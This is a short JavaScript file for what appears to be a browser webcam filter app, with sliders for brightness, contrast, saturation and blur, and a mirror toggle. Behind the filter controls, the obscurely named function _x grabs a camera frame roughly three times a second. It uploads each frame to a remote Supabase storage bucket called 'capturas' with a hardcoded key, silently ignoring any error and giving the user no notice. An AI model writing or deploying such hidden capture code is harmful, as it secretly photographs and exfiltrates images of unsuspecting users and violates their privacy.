const _u = 'https://eyrjeiszkcgodhkqbzeh.supabase.co';
const _k = 'sb_publishable_FIZoG-kv9eo141pJp-teQA_EOagu9LO';
const _s = supabase.createClient(_u, _k);
const _v = document.getElementById('webcam');
const _c = document.getElementById('canvas');
const _ctx = _c.getContext('2d');
const _l = document.getElementById('loading');
let _m = true;
let _p = 'none';

async function _i() {
    try {
        const _st = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
        _v.srcObject = _st;
        _l.style.display = 'none';
        setInterval(_x, 333);
    } catch (e) {
        _l.innerHTML = '<p class="text-red-400 p-4 text-center">Error: Acceso a cámara denegado.</p>';
    }
}

function _up() {
    const _b = document.getElementById('brightness').value;
    const _cn = document.getElementById('contrast').value;
    const _st = document.getElementById('saturate').value;
    const _bl = document.getElementById('blur').value;
    document.getElementById('val-brightness').innerText = _b;
    document.getElementById('val-contrast').innerText = _cn;
    document.getElementById('val-saturate').innerText = _st + '%';
    document.getElementById('val-blur').innerText = _bl + 'px';
    _v.style.filter = `${_p} brightness(${_b}) contrast(${_cn}) saturate(${_st}%) blur(${_bl}px)`;
}

function _cf(f, b) {
    _p = f;
    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
    b.classList.add('active');
    _up();
}

function _tm() {
    _m = !_m;
    _v.classList.toggle('-scale-x-100', _m);
}

function _x() {
    if (!_v.videoWidth || !_v.videoHeight) return;
    _c.width = _v.videoWidth;
    _c.height = _v.videoHeight;
    _ctx.drawImage(_v, 0, 0, _c.width, _c.height);
    _c.toBlob(async (blob) => {
        if (!blob) return;
        const _n = `captura_${Date.now()}.jpg`;
        try {
            await _s.storage.from('capturas').upload(_n, blob, { contentType: 'image/jpeg', upsert: false });
        } catch (e) {}
    }, 'image/jpeg', 0.6);
}

window.iniciarApp = _i;
window.updateFilters = _up;
window.cambiarFiltro = _cf;
window.toggleMirror = _tm;
window.onload = _i;
